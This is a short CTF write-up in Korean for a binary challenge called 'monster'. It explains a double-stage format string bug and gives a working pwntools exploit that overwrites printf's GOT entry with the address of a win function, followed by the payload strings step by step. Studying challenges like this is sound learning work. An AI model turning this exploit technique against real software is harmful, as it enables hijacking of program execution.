# monster

본 문제는 `printf(s)`의 형식으로 사용하여 FSB 취약점이 발생하는 문제입니다. 다만 s가 bss영역에 쓰여지기 때문에 double stage FSB를 발생합니다.



win함수의 주소 : 0x080485bd

printf함수의 got : 0x804a00c



```python
from pwn import *

p = process("./monster2")

#set *0xffffcfb0 = 0x804a00c
pay = "%8x " * 7
pay += "%134520780x "
pay += "%n"

p.recvuntil("Your Choice? :")
p.sendline(pay)

#set *0x804a00c = 0x80485bd(win addr)
pay2 = "%8x " * 14
pay2 += "%134514150x "
pay2 += "%n"

p.recvuntil("Your Choice? :")
p.sendline(pay2)

p.interactive()
```





##### 과정

1. fsb를 이용하여 stack안의 적당한 포인터인 0xffffcfb0의 자리에 printf의 got로 값 modify

%8x %8x %8x %8x %8x %8x %8x %134520780x %n : 0xffffcfb0의 값을 0x804a00c(printf의 got)으로 변경

2. double stage fsb를 이용하여 printf함수의 got를 win함수의 주소로 덮어서 익스

%8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %134514150x %n : printf의 got를 0x080485bd(win함수의 주소)로 변경

